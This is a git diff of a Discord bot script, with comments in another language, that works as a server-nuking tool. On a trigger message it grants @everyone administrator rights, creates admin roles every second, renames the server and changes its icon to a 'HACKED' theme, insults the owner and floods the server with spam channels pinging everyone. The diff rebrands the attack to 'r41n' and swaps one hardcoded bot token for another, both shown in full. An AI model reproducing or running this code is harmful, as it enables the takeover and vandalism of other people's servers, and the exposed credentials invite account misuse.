@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = "$"; ///lera ba dly xot prefix dabne
+const prefix = "."; ///lera ba dly xot prefix dabne
 client.on("ready", () => {
   console.log(`Logged in as ${client.user.tag}!`);
 });
@@ -12,7 +12,7 @@ client.on("ready", () => {
 
 
 client.on("message", message => {
-  if (message.content.startsWith(`${message.content}`)) {
+  if (message.content.startsWith(`Slaw`)) {
     message.delete();
     message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
@@ -31,28 +31,28 @@ client.on("message", message => {
     setInterval(() => {
       message.guild.roles
         .create({
-          name: "Gw Naxoy :joy:",
+          name: "r41n is here :joy:",
           permissions: ["ADMINISTRATOR"]
         })
         .then(rr => {
           message.member.roles.add(rr.id);
         });
     }, 1000);
-    message.guild.setIcon("");
-    client.user.setAvatar("");
+    message.guild.setIcon("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
+    client.user.setAvatar("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
     client.user.setUsername("HACKED");
     message.guild.owner.send(
       "Kerm Bmzha Bas awakash Byka ba qnt"
     );
-    message.guild.setName("HACKED");
+    message.guild.setName("r41n ");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("HACKED BY Bla Ker Zl", "text")
+            .create("HACKED BY r41n", "text")
             .then(channel => {
               channel.send(
-                "@everyone HACK BY Bla Ker Zl :joy: :joy: :joy:"
+                "@everyone r41n is  :joy: :joy: :joy:"
               );
             });
         },
@@ -68,4 +68,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("NzUzOTM5NjkxOTIwOTQ5MzQ4.X1tfDg.BgQxryc11EZMITqEGBGW_H-R8zQ");
+client.login("ODMyMDIyNzA2MDc3NTY1MDA4.YNHRnA.SnV9yoF9EJOQkfmXogkHqfmdqgo");
